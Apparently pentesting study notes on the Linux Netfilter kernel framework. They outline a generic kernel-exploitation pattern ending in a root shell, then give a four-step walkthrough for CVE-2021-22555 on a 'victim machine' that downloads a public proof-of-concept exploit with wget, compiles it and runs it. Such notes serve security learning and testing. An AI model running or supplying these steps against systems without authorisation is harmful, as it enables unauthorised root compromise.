Netfilter is a **Linux kernel framework** that processes network packets inside the kernel before they reach user space applications.

It is the base system used by:

- `iptables`
    
- `nftables`
    
- `arptables`
    

### What Netfilter does inside kernel:

- Packet filtering (firewall rules)
    
- NAT (Network Address Translation)
    
- Connection tracking (stateful inspection)
    
- Packet manipulation (modify/drop/redirect)
    

---

## Packet Flow Concept

When a packet enters Linux:

```text
NIC → Kernel → Netfilter hooks → iptables/nftables rules → Application
```

Netfilter intercepts packets at multiple hook points:

- PREROUTING
    
- INPUT
    
- FORWARD
    
- OUTPUT
    
- POSTROUTING
    

---

## Why Netfilter is Important in Privilege Escalation

Netfilter runs in **kernel space**, so:

- Bugs here → kernel memory corruption
    
- Kernel memory corruption → root access
    
- Exploits often lead to:
    
    - UAF (Use-after-free)
        
    - Heap overflow
        
    - Out-of-bounds write
        

---

## Common Exploitation Pattern

Most Netfilter exploits follow:

1. Trigger kernel bug via packet manipulation
    
2. Corrupt kernel memory (heap/slab)
    
3. Leak kernel addresses (KASLR bypass)
    
4. Overwrite control structures
    
5. Execute privilege escalation payload
    
6. Spawn root shell

# CVE-2021-22555 (Netfilter Heap Overflow)

### Impact

- Heap out-of-bounds write in Netfilter
    
- Kernel 2.6 → 5.11
    
- Can lead to root via memory corruption
    

---

## Step 1 — Check Kernel (Victim Machine)

```bash
uname -r
```

---

## Step 2 — Download Exploit

```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
```

---

## Step 3 — Compile Exploit

```bash
gcc -m32 -static exploit.c -o exploit
```

---

## Step 4 — Run Exploit

```bash
./exploit
```
